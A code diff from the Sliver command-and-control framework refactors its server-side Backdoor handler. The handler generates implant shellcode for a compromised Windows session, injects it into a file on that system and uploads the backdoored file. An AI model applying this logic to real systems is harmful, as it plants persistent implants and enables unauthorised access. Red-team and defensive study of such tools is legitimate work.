@@ -29,33 +29,16 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/server/core"
-	"github.com/bishopfox/sliver/server/db"
+	"github.com/bishopfox/sliver/server/cryptography"
 	"github.com/bishopfox/sliver/server/generate"
-	"github.com/bishopfox/sliver/util"
 	"github.com/bishopfox/sliver/util/encoders"
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/status"
 )
 
 // Backdoor - Inject a sliver payload in a file on the remote system
-func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*clientpb.Backdoor, error) {
-	var (
-		name string
-		err  error
-	)
-
-	if req.Name == "" {
-		name, err = codenames.GetCodename()
-		if err != nil {
-			return nil, err
-		}
-	} else if err := util.AllowedName(name); err != nil {
-		return nil, err
-	} else {
-		name = req.Name
-	}
-
-	resp := &clientpb.Backdoor{}
+func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sliverpb.Backdoor, error) {
+	resp := &sliverpb.Backdoor{}
 	session := core.Sessions.Get(req.Request.SessionID)
 	if session.OS != "windows" {
 		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("%s is currently not supported", session.OS))
@@ -95,18 +78,20 @@ func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*cl
 		return nil, fmt.Errorf("please select a profile targeting a shellcode format")
 	}
 
-	build, err := generate.GenerateConfig(name, p.Config)
+	if p.Config.Name == "" {
+		p.Config.Name, err = codenames.GetCodename()
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	name, config := generate.ImplantConfigFromProtobuf(p.Config)
+	otpSecret, _ := cryptography.TOTPServerSecret()
+	err = generate.GenerateConfig(name, config, true)
 	if err != nil {
 		return nil, err
 	}
-
-	// retrieve http c2 implant config
-	httpC2Config, err := db.LoadHTTPC2ConfigByName(p.Config.HTTPC2ConfigName)
-	if err != nil {
-		return nil, status.Error(codes.Internal, err.Error())
-	}
-
-	fPath, err := generate.SliverShellcode(name, build, p.Config, httpC2Config.ImplantConfig)
+	fPath, err := generate.SliverShellcode(name, otpSecret, config, true)
 	if err != nil {
 		return nil, status.Error(codes.Internal, err.Error())
 	}
@@ -121,7 +106,7 @@ func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*cl
 	if err != nil {
 		return nil, status.Error(codes.Internal, err.Error())
 	}
-	uploadGzip, _ := new(encoders.Gzip).Encode(newFile)
+	uploadGzip := new(encoders.Gzip).Encode(newFile)
 	// upload to remote target
 	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
 		Encoder: "gzip",
